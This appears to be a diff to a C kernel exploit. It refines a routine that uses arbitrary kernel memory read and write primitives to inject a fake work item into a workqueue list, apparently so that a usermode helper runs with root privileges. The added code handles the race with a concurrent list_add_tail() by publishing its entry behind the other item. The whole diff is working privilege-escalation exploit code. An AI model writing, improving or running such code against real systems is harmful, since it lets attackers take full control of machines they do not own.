@@ -514,7 +514,40 @@ static int install_workqueue_umh_root(int fd) {
     if (!list_prev_write ||
         !root_read64(fd, worklist, &list_next) || list_next != worklist) {
       uint64_t tail_now = 0;
+      uint64_t fake_next = 0;
       (void)root_read64(fd, worklist + sizeof(uint64_t), &tail_now);
+      /* A list_add_tail() that lands between our tail store and its readback
+       * takes our entry as its predecessor: the kernel then writes its own
+       * new item into our next link and sets the pool tail to it, so the
+       * chain below is head -> ours -> theirs -> head as soon as head->next
+       * points at us. Publishing instead of aborting keeps both work items
+       * reachable; undoing here would leave head->next == head while
+       * head->prev points past our scratch page, which no later
+       * list_add_tail() repairs and which stalls the pool for good. */
+      if (list_prev_write == 0 && tail_now != fake_entry &&
+          root_read64(fd, fake_entry, &fake_next) &&
+          fake_next != worklist && fake_next != fake_entry &&
+          is_direct_ptr((uintptr_t)fake_next)) {
+        pr_info("root umh tail stolen by %016llx try=%d/%d; publishing "
+                "behind it\n",
+                (unsigned long long)tail_now, inject_try + 1,
+                ROOT_UMH_INJECT_ATTEMPTS);
+        list_next_write = root_write64(fd, worklist, fake_entry);
+        uint64_t published_next = 0;
+        if (list_next_write ||
+            (root_read64(fd, worklist, &published_next) &&
+             published_next == fake_entry) ||
+            (root_read64(fd, fake_entry, &fake_next) &&
+             fake_next == fake_entry)) {
+          published = 1;
+          break;
+        }
+        pr_warning("root umh publish lost race ret=%d next=%016llx "
+                   "try=%d/%d\n",
+                   list_next_write, (unsigned long long)published_next,
+                   inject_try + 1, ROOT_UMH_INJECT_ATTEMPTS);
+      }
+      (void)root_read64(fd, worklist, &list_next);
       pr_warning("root umh prepublish lost race try=%d/%d counters=%d/%d/%d "
                  "prev=%d tail=%016llx want=%016llx next=%016llx\n",
                  inject_try + 1, ROOT_UMH_INJECT_ATTEMPTS, inflight_write,
